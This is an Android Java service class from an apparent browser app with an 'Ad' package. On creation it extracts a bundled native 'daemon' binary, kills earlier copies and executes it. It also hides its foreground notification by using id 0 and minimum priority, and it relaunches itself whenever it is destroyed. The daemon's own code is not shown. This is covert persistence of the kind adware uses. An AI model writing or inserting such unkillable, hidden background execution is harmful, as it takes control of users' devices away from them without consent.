package io.github.mthli.Ninja.Service;

import java.io.File;

import org.zirco.R;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import io.github.mthli.Ninja.Ad.DmUtil;

public class CoreService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return Service.START_STICKY;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		improvePriority();

		String dmPath = getFilesDir() + "/daemon";
		DmUtil.killDaemon(DmUtil.getDaemons(dmPath));
		DmUtil.saveDaemon(this, new File(dmPath), R.raw.daemon, false);
		DmUtil.exec(dmPath + " " + getPackageName() + "/" + getClass().getName());
		
		startService(new Intent(this, NotificationService.class));
	}

	@Override
	public void onDestroy() {
		super.onDestroy();

		worsenPriority();
		startService(new Intent(this, CoreService.class));
	}

	private void improvePriority() {
		Notification notification = new Notification();
		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN) {
			notification.priority = Notification.PRIORITY_MIN;
		}
		startForeground(0, notification);
	}

	private void worsenPriority() {
		stopForeground(true);
	}
}
